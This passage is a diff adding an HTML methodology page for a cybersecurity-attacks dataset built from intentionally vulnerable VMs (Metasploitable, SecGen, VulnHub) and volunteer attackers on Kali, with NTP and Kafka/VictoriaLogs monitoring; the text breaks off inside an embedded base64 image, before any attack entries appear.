@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity Attacks Dataset - Methodology</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    line-height: 1.7;
+    color: #1a1a2e;
+    background: #f7f8fa;
+  }
+
+  a { color: #3b5bdb; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  .layout { display: flex; min-height: 100vh; }
+
+  /* SIDEBAR */
+  .sidebar {
+    width: 210px;
+    flex-shrink: 0;
+    background: #fff;
+    border-right: 1px solid #e8eaed;
+    padding: 32px 0;
+    position: sticky;
+    top: 0;
+    height: 100vh;
+    overflow-y: auto;
+  }
+
+  .sidebar-title {
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: #868e96;
+    padding: 0 20px 20px;
+    border-bottom: 1px solid #e8eaed;
+    margin-bottom: 16px;
+  }
+
+  .nav-link {
+    display: block;
+    padding: 6px 20px;
+    font-size: 13px;
+    color: #495057;
+    border-left: 2px solid transparent;
+    transition: all 0.15s;
+  }
+
+  .nav-link:hover {
+    color: #3b5bdb;
+    background: #f0f4ff;
+    border-left-color: #3b5bdb;
+    text-decoration: none;
+  }
+
+  .nav-link.sub {
+    padding-left: 32px;
+    font-size: 12px;
+    color: #868e96;
+  }
+
+  .nav-link.sub:hover { color: #3b5bdb; }
+
+  /* MAIN */
+  .main {
+    flex: 1;
+    padding: 48px 56px 80px;
+    max-width: 860px;
+  }
+
+  /* PAGE HEADER */
+  .page-header {
+    margin-bottom: 48px;
+    padding-bottom: 32px;
+    border-bottom: 1px solid #e8eaed;
+  }
+
+  .page-header h1 {
+    font-size: 28px;
+    font-weight: 600;
+    color: #1a1a2e;
+    margin-bottom: 8px;
+  }
+
+  .page-header p { color: #868e96; font-size: 14px; max-width: 520px; }
+
+  /* SECTIONS */
+  .section { margin-bottom: 56px; scroll-margin-top: 24px; }
+
+  .section h2 {
+    font-size: 18px;
+    font-weight: 600;
+    color: #1a1a2e;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section h2 .num {
+    font-size: 12px;
+    font-weight: 500;
+    color: #3b5bdb;
+    background: #edf2ff;
+    padding: 2px 8px;
+    border-radius: 4px;
+  }
+
+  .section-divider { height: 1px; background: #e8eaed; margin: 12px 0 24px; }
+
+  h3 {
+    font-size: 13px;
+    font-weight: 600;
+    color: #495057;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    margin: 24px 0 10px;
+  }
+
+  p { margin-bottom: 10px; color: #343a40; font-size: 14px; }
+
+  ul, ol { padding-left: 20px; margin: 8px 0; }
+  li { margin-bottom: 5px; color: #343a40; font-size: 14px; }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    background: #f1f3f5;
+    border: 1px solid #dee2e6;
+    padding: 1px 5px;
+    border-radius: 3px;
+    color: #e64980;
+  }
+
+  /* CODE BLOCKS */
+  .code-block { margin: 10px 0; border-radius: 6px; overflow: hidden; border: 1px solid #dee2e6; }
+
+  .code-block-label {
+    background: #f1f3f5;
+    border-bottom: 1px solid #dee2e6;
+    padding: 4px 12px;
+    font-size: 10px;
+    font-weight: 500;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #868e96;
+    font-family: 'Inter', sans-serif;
+  }
+
+  pre {
+    background: #fff;
+    padding: 12px 14px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12.5px;
+    line-height: 1.65;
+    color: #343a40;
+    overflow-x: auto;
+    margin: 0;
+  }
+
+  /* ATTACK BLOCK */
+  .attack {
+    border: 1px solid #dee2e6;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    background: #fff;
+    overflow: hidden;
+  }
+
+  .attack-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 12px 18px;
+    background: #f8f9fa;
+    border-bottom: 1px solid #dee2e6;
+    flex-wrap: wrap;
+  }
+
+  .attack-num { font-size: 11px; font-weight: 600; color: #868e96; flex-shrink: 0; }
+  .attack-title { font-size: 14px; font-weight: 600; color: #1a1a2e; flex: 1; }
+
+  .badge {
+    font-size: 11px;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-weight: 500;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .badge-name { background: #edf2ff; color: #3b5bdb; }
+  .badge-tcp  { background: #e6fcf5; color: #0ca678; }
+  .badge-udp  { background: #fff4e6; color: #e8590c; }
+  .badge-port { background: #f1f3f5; color: #495057; }
+  .badge-cve  { background: #fff5f5; color: #c92a2a; }
+  .badge-win  { background: #edf2ff; color: #3b5bdb; }
+  .badge-wip  { background: #fff4e6; color: #e8590c; }
+
+  .attack-body { padding: 16px 18px; }
+
+  .step-label {
+    font-size: 10px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: #adb5bd;
+    margin: 14px 0 4px;
+  }
+
+  .step-label:first-child { margin-top: 0; }
+
+  /* VM SECTION HEADERS */
+  .vm-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 36px 0 16px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid #e8eaed;
+  }
+
+  .vm-header h3 {
+    font-size: 15px;
+    font-weight: 600;
+    color: #1a1a2e;
+    text-transform: none;
+    letter-spacing: 0;
+    margin: 0;
+  }
+
+  .vm-note { font-size: 12px; color: #adb5bd; margin-bottom: 16px; font-style: italic; }
+
+  /* STATUS PILLS */
+  .status-row { display: flex; gap: 10px; flex-wrap: wrap; margin: 12px 0; }
+
+  .status-pill {
+    font-size: 12px;
+    padding: 6px 14px;
+    border-radius: 6px;
+    border: 1px solid;
+  }
+
+  .status-pill.success { background: #e6fcf5; border-color: #63e6be; color: #0ca678; }
+  .status-pill.ran     { background: #edf2ff; border-color: #91a7ff; color: #3b5bdb; }
+  .status-pill.error   { background: #fff5f5; border-color: #ffa8a8; color: #c92a2a; }
+
+  /* TABLE */
+  .table-wrap { border: 1px solid #dee2e6; border-radius: 6px; overflow: hidden; margin: 12px 0; }
+
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+
+  th {
+    text-align: left;
+    padding: 8px 12px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: #868e96;
+    border-bottom: 1px solid #dee2e6;
+    background: #f8f9fa;
+  }
+
+  td { padding: 9px 12px; border-bottom: 1px solid #f1f3f5; vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  td:first-child { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #e64980; }
+
+  strong { font-weight: 600; color: #1a1a2e; }
+</style>
+</head>
+<body>
+<div class="layout">
+
+  <nav class="sidebar">
+    <div class="sidebar-title">Methodology</div>
+    <a href="#general"    class="nav-link">General Info</a>
+    <a href="#scenario"   class="nav-link">Scenario</a>
+    <a href="#monitoring" class="nav-link">Monitoring</a>
+    <a href="#attacks"    class="nav-link">Attacks</a>
+    <a href="#ms2"        class="nav-link sub">Metasploitable 2</a>
+    <a href="#ms3"        class="nav-link sub">Metasploitable 3</a>
+    <a href="#secgen"     class="nav-link sub">SecGen</a>
+    <a href="#vulnhub"    class="nav-link sub">VulnHub</a>
+    <a href="#labeling"   class="nav-link">Auto Labeling</a>
+  </nav>
+
+  <main class="main">
+
+    <div class="page-header">
+      <h1>Cybersecurity Attacks Dataset</h1>
+      <p>Methodology for creating a labeled network attack dataset using intentionally vulnerable VMs and volunteer attackers.</p>
+    </div>
+
+    <!-- GENERAL -->
+    <section class="section" id="general">
+      <h2><span class="num">01</span> General Info</h2>
+      <div class="section-divider"></div>
+      <p>This project is focused on creation of a Cybersecurity Attacks Dataset which can later be used for IDS/IPS systems, ML, or any other relevant purpose.</p>
+      <p>The idea is to have an isolated environment with intentionally vulnerable VMs and volunteer attackers who will conduct the attacks. The following sections cover each aspect of the project and form the complete methodology.</p>
+    </section>
+
+    <!-- SCENARIO -->
+    <section class="section" id="scenario">
+      <h2><span class="num">02</span> Scenario</h2>
+      <div class="section-divider"></div>
+      <p>A controlled environment with vulnerable machines and attacker machines.</p>
+
+      <h3>Vulnerable Machines</h3>
+      <p>7 instances of each type:</p>
+      <ul>
+        <li><strong>Metasploitable 2 VMs</strong> - Linux</li>
+        <li><strong>Metasploitable 3 VMs</strong> - Windows</li>
+        <li><strong>SecGen Custom VMs</strong> - still under testing</li>
+        <li><strong>VulnHub Docker Containers</strong> - recent CVEs, different container combinations per VM</li>
+      </ul>
+
+      <h3>Attacker Machines</h3>
+      <p>Each attacker is given a <strong>preconfigured Kali Linux VM</strong> inside the environment with all required tools. Total: <strong>7 Kali Linux VMs</strong>.</p>
+    </section>
+
+    <!-- MONITORING -->
+    <section class="section" id="monitoring">
+      <h2><span class="num">03</span> Monitoring</h2>
+      <div class="section-divider"></div>
+
+      <h3>RAW Packet Capture</h3>
+      <p>Still to be tested - waiting on Bidik's proposal.</p>
+
+      <h3>NTP Synchronization</h3>
+      <ul>
+        <li>NTP server: <code>ntp.finki.ukim.mk</code> - configured on all machines</li>
+        <li><strong>Linux (systemd):</strong> <code>/etc/systemd/timesyncd.conf</code></li>
+        <li><strong>Older Linux:</strong> manual NTP installation</li>
+        <li><strong>Windows:</strong> Windows Time Service (<code>W32Time</code>)</li>
+      </ul>
+
+      <h3>Logs</h3>
+      <ul>
+        <li><a href="https://github.com/VictoriaMetrics/VictoriaLogs" target="_blank">VictoriaLogs</a> - stores all system logs, pulls from Kafka queue</li>
+        <li><strong>Log Agent</strong> on each machine - ships logs to Kafka. Options: <a href="https://grafana.com/grafana/dashboards/20881-promtail-monitoring-metrics-and-logs/" target="_blank">Grafana Promtail</a>, <a href="https://fluentbit.io/" target="_blank">Fluent Bit</a></li>
+        <li><a href="https://kafka.apache.org/" target="_blank">Kafka</a> - receives and queues logs from each machine</li>
+      </ul>
+
+<div style="text-align:center; margin: 16px 0;"><img src="data:image/png;base64,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